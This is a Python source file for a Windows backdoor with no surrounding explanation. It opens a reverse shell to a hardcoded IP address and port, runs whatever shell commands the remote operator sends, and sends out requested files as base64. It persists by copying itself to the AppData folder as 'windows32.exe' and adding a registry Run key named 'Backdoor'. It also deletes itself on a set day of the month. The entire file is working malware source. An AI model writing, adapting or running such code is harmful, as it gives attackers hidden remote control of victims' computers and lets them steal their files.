#! /usr/bin/python

import os
import socket
import subprocess
import base64
import datetime
import shutil
import time
from os import remove
from sys import argv


def connection():
	while(True):
		time.sleep(20)
		try:
			sock.connect(("172.25.187.58", 54321))
			shell()
			break
		except:
			connection()

def send(data):
	data = data.encode('utf-8')
	sock.send(data)
def receive():
	while(True):
		try:
			data = sock.recv(1024).decode('utf-8')
			return data
		except ValueError:
			continue

def sf(name):
	file = open(name, "rb")
	while (True):
		data = file.read(768)
		if not data:
			break
		send(base64.b64encode(data))
	time.sleep(1)
	send("Donedone")

def shell():
	while (True):
		command = receive()
		if(command == "end"):
			break
		if (command == "clear"):
			continue
		if (command[:3] == "get"):
			sf(command[4:])
		elif (command[:2] == "cd" and len(command) > 1):
			try:
				os.chdir(command[3:])
			except:
				send("[!!]No such directory")
		else:
			proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
			result = proc.stdout.read() + proc.stderr.read()
			send(result)
			time.sleep(1)
			send("Sentall")


#SELF DESTRUCT
sam = datetime.datetime.now()
if (sam.day == 18):
	remove(argv[0])
	exit()

#REGISTRY
location = os.environ["appdata"] + "\\windows32.exe"
if not os.path.exists(location):
	shutil.copyfile(sys.executable,location)
	subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "' + location + '"', shell=True)


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

connection ()
sock.close()
